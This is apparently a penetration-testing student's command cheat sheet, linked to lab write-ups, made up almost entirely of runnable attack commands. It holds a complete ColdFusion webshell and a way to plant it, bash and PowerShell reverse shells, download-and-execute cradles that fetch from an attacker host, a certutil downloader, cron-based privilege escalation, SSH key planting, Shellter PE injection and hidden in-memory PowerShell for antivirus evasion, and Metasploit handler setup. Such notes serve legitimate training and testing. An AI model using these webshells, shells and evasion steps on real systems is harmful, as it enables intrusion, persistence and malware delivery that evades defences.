# Shells & Payloads, Command Appendix

Part of [[COMMAND APPENDIX]]. Webshells, reverse shells, and SSH-based access/persistence.

---

## Webshells

```bash
ls -la /usr/share/webshells        # php/, asp/, aspx/, cfm/, jsp/, perl/, laudanum/
ls /usr/share/webshells/php/       # simple-backdoor.php, php-reverse-shell.php
ls /usr/share/webshells/aspx/      # cmdasp.aspx

# Edit a Pentestmonkey-style reverse shell's IP/port before hosting it
sed -i "s/\$ip = '127.0.0.1';/\$ip = '<your_ip>';/" php-reverse-shell.php
sed -i "s/\$port = 1234;/\$port = 4444;/" php-reverse-shell.php
```
```html
<!-- Self-referencing CFM webshell (ColdFusion), submits to itself and runs the cmd field -->
<html><body><cfoutput>
<form method="POST" action="shell.cfm">
<input type=text name="cmd" size=80
  <cfif isdefined("form.cmd")>value="#form.cmd#"</cfif>>
<input type=submit value="Exec">
</form>
<cfif isdefined("form.cmd")>
<cfexecute name="#Form.cmd#" arguments="" timeout="5"></cfexecute>
</cfif>
</cfoutput></body></html>
```
*The CFM shell above needs a way onto the target's own web root to be reachable. On ColdFusion Admin specifically, its Scheduled Tasks feature will fetch a URL and save the response to a file you choose, an easy way to drop the shell without any file-upload vector at all: point a new scheduled task's URL at your hosted `shell.cfm`, set "Save output to file" to a path under the app's own `wwwroot`, then run it once.*

See [[Common Web Application Attacks#9.2.3. Remote File Inclusion (RFI)|9.2.3]], [[Common Web Application Attacks#9.3.1. Using Executable Files|9.3.1]], [[Common Web Application Attacks#9.4.1. OS Command Injection|9.4.1 (case study 4)]], [[Arctic|Arctic box writeup]] (the CFM shell, delivered via ColdFusion's Scheduled Tasks).

#### Tags: #Webshells #PHPWebshell #ASPNETWebshell #CFMWebshell #ScheduledTask

---

## Reverse Shells

```bash
# Bash (Linux), URL-encode if delivered via a POST body/URL parameter
bash -c "bash -i >& /dev/tcp/<your_ip>/4444 0>&1"

# Netcat listener (run this BEFORE triggering any of the below)
nc -nvlp 4444
```
```powershell
# PowerShell one-liner, base64-encode with Unicode before delivering via powershell -enc
$Text = '<powershell reverse shell script>'
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
$EncodedText = [Convert]::ToBase64String($Bytes)
```
```bash
# Powercat (PowerShell-native netcat), host it and trigger via a download cradle
cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .
python3 -m http.server 80
# Inject (URL-encoded): IEX (New-Object System.Net.Webclient).DownloadString("http://<your_ip>/powercat.ps1");powercat -c <your_ip> -p 4444 -e powershell
```
See [[Common Web Application Attacks#9.2.1. Local File Inclusion (LFI)|9.2.1]] (bash), [[Common Web Application Attacks#9.3.1. Using Executable Files|9.3.1]] (PowerShell base64), [[Common Web Application Attacks#9.4.1. OS Command Injection|9.4.1]] (Powercat), [[Client-Side Attacks#12.2.3. Leveraging Microsoft Word Macros|12.2.3]] (delivered via a VBA macro, chunked into ≤255-char string literals), [[Client-Side Attacks#Step 4: Build the `.lnk` shortcut payload (the actual reverse-shell trigger)|12.3.1]] (delivered via a `.lnk` shortcut's target field).

> 🔗 Reverse shell one-liners for any language/encoding: revshells.com

#### Tags: #ReverseShell #Powercat #BashReverseShell #PowerShellReverseShell

---

## SSH

```bash
# Connect with a private key on a non-standard port
ssh -i <keyfile> -p <port> <user>@<target>

# Fix key permissions (required before use)
chmod 400 <keyfile>

# Clear stale host keys (needed when a hostname gets reused across different lab VMs)
rm ~/.ssh/known_hosts

# Generate a keypair to plant (e.g. via an upload+traversal authorized_keys overwrite)
ssh-keygen -f <keyname>
cat <keyname>.pub > authorized_keys

# Convert a key OpenSSL 3.x refuses to load ("error in libcrypto: unsupported")
# Root cause is usually a corrupted/truncated copy, not real incompatibility, diff against
# a mechanically re-extracted copy before chasing OpenSSL-version theories
ssh-keygen -p -m PEM -f <keyfile>
```
See [[Common Web Application Attacks#9.1.2. Identifying and Exploiting Directory Traversals|9.1.2]] (the libcrypto troubleshooting saga), [[Common Web Application Attacks#9.3.2. Using Non-Executable Files|9.3.2]] (planting a key via upload+traversal).

#### Tags: #SSH #SSHKeyTheft #SSHKeyPlanting #LibcryptoTroubleshooting

---

## Delivering a Payload Without Direct Upload Access

Two patterns worth having as reflexes when there's no file-upload form to abuse directly, but there's another way to get a file to run.

```cmd
:: certutil, a Microsoft-signed binary that ships on every Windows install by default,
:: repurposed as a downloader (LOLBIN = Living Off the Land Binary, using a legit OS tool
:: for something it wasn't designed for). No upload tool needed on the target beforehand,
:: the "downloader" is already sitting there.
cmd.exe /c certutil -urlcache -split -f "http://<your_ip>/nc.exe" C:\ProgramData\nc.exe
```
```bash
# A root-owned cron job that runs every file in a writable directory, drop a payload
# and wait for the timer, don't execute it yourself (that only gets you a shell as your
# own low-priv user, not root). Watch for the dotfile-exclusion gotcha: a bash glob like
# *.py never matches a leading-dot filename, so the payload's name must NOT start with a dot.
nc -lnvp <port>                                    # listener, start this first
echo "<reverse shell payload>" > /path/to/watched/dir/shell.py   # no leading dot
# wait up to the cron interval (often ~60s), then check the listener
```
See [[Arctic|Arctic box writeup]] (`certutil` pulling down `nc.exe` and `JuicyPotato.exe`), [[Bashed|Bashed box writeup]] (the root cron job iterating `*.py`), [[Privilege Escalation & Local Exploitation (Breakdowns)|Command Breakdowns]] for the full mechanics of both.

#### Tags: #Certutil #LOLBIN #CronPrivesc #DotfileExclusion

---

## PowerShell In-Memory Injection (AV Bypass)

Fetch and execute a PowerShell payload entirely in memory -- nothing writes to disk, bypasses AV on-access scanning.

```bash
# Kali: serve the payload script
cd /path/to/payload/dir
python3 -m http.server 80

# Kali: nc listener (for stageless/plain PowerShell payloads)
nc -nvlp <port>
```
```powershell
# Victim: download-and-execute cradle, runs entirely in memory
powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('http://<kali_ip>/payload.ps1')"
```

For Meterpreter or staged payloads instead of a plain nc shell, replace the nc listener above with msfconsole multi/handler (see the Staged Payload Handler section below).

Flag breakdown: `-NoP` skips the startup profile (removes logging hooks), `-NonI` suppresses interactive prompts, `-W Hidden` hides the terminal window, `-Exec Bypass` overrides execution policy for this session only. Full teardown: [[Antivirus Evasion (Breakdowns)#The PowerShell AV-bypass flags|Command Breakdowns]].

See [[Antivirus Evasion#15.3.2. PowerShell In-Memory Injection|15.3.2]], [[Antivirus Evasion#Capstone 2: .bat Wrapper + COMODO|Capstone 2 (.bat variant)]].

#### Tags: #AntivirusEvasion #PowerShellInjection #IEX #DownloadCradle #InMemory

---

## Shellter PE Injection

Inject a shellcode payload into a legitimate 32-bit Windows `.exe` so AV sees a known-good binary envelope.

```bash
# Prereq: install wine32 support (one-time, only needed on fresh Kali installs)
sudo dpkg --add-architecture i386 && sudo apt update && sudo apt -y install wine32:i386

# Reset Wine prefix to 32-bit (needed if Wine ran before wine32 was installed -- clears broken 64-bit prefix)
rm -rf ~/.wine && WINEARCH=win32 wineboot

# Verify your target PE is 32-bit (Shellter rejects PE32+ / 64-bit binaries)
file <target.exe>   # must say "PE32 executable", not "PE32+"

# Run Shellter
shellter
```

Shellter interactive session (Auto mode, Stealth on, listed payload):
```
PE or operation mode: A                     # Auto mode
PE target path: /path/to/target.exe         # the 32-bit PE to inject into (gets modified in place)
Enable Stealth Mode? Y                      # preserves the original PE's execution flow post-payload
Use listed payload or custom? L             # L for listed, not the payload index number
Select payload by index: 1                  # 1 = Meterpreter_Reverse_TCP [stager], 5 = Shell_Reverse_TCP [stager]
LHOST: <kali_ip>
LPORT: <port>
```

If the payload menu label says `[stager]`, use the Staged Payload Handler below -- nc alone won't work.

wine32 and prefix mechanics: [[Antivirus Evasion (Breakdowns)#Why Shellter needs wine32|Command Breakdowns]].

See [[Antivirus Evasion#15.3.3. Shellter + Spotify Hands-On|15.3.3]], [[Antivirus Evasion#Capstone 1: Shellter + PuTTY + COMODO + FTP|Capstone 1]].

#### Tags: #AntivirusEvasion #Shellter #PEInjection #Wine #Stealth

---

## Staged Payload Handler (msfconsole multi/handler)

Required whenever the payload binary is a stager (indicated by `[stager]` in Shellter's menu, or slash notation like `windows/shell/reverse_tcp` in msfvenom). nc accepts the connection but can't serve the second stage.

```bash
msfconsole -q
use multi/handler

# For a staged shell (Shellter index 5, or msfvenom windows/shell/reverse_tcp)
set PAYLOAD windows/shell/reverse_tcp

# For staged Meterpreter (Shellter index 1, or msfvenom windows/meterpreter/reverse_tcp)
set PAYLOAD windows/meterpreter/reverse_tcp

set LHOST <kali_ip>
set LPORT <port>
run
```

Slash (`windows/shell/reverse_tcp`) = staged, needs this handler. Underscore (`windows/shell_reverse_tcp`) = stageless, works with plain nc. Using the underscore variant in multi/handler against a stager binary gives "Session is not valid and will be closed."

Staged vs stageless mechanics: [[Antivirus Evasion (Breakdowns)#Staged vs stageless payloads|Command Breakdowns]].

See [[Antivirus Evasion#15.3.3. Shellter + Spotify Hands-On|15.3.3]], [[Antivirus Evasion#Capstone 1: Shellter + PuTTY + COMODO + FTP|Capstone 1]].

#### Tags: #AntivirusEvasion #MultiHandler #StagedPayload #Meterpreter #Msfconsole

---

## FTP Active-Mode Payload Delivery

When delivering a payload binary to a Windows victim via FTP (e.g. a victim box auto-executing any .exe dropped into its FTP root).

```bash
# Active mode (-A) is needed for many Windows FTP servers that don't support passive by default
ftp -A <target_ip>

# At the login prompts:
# Username: anonymous        (type "anonymous" explicitly -- blank Enter gives 530 error)
# Password: <any string>     (anonymous FTP typically accepts anything or blank)

# In the FTP session:
binary                        # switch to binary transfer mode (required for .exe/.bat -- ASCII mode corrupts them)
put /local/path/payload.exe payload.exe   # always give an explicit remote filename
                                          # without it, FTP sends the full local path as the remote name, which fails
```

Common gotchas:
- Blank Enter at "Name:" gives `530 User cannot log in` -- type `anonymous` explicitly
- `put /tmp/file.exe` alone gives `550 The system cannot find the path specified` because FTP uses the full local path `/tmp/file.exe` as the remote filename, which Windows rejects. Always `put <local> <remote>`.
- Missing `binary` mode corrupts the binary -- the session will appear to succeed but the file won't execute

See [[Antivirus Evasion#Capstone 1: Shellter + PuTTY + COMODO + FTP|Capstone 1]], [[Antivirus Evasion#Capstone 2: .bat Wrapper + COMODO|Capstone 2]].

#### Tags: #AntivirusEvasion #FTP #PayloadDelivery #ActiveMode

---

## **Outstanding**
This area grows alongside the modules. Whenever a new shell delivery mechanism comes up (Windows named-pipe shells, etc), add it here with a link back to the source section.

*(`msfvenom` syntax for generating shellcode/payloads lives in [[Buffer Overflow & Memory Corruption#msfvenom: Generating Shellcode for a BOF Payload|Buffer Overflow & Memory Corruption]], where it was first taught in depth, since [[Fixing Exploits]] is where bad-char/encoder/format flags actually mattered.)*
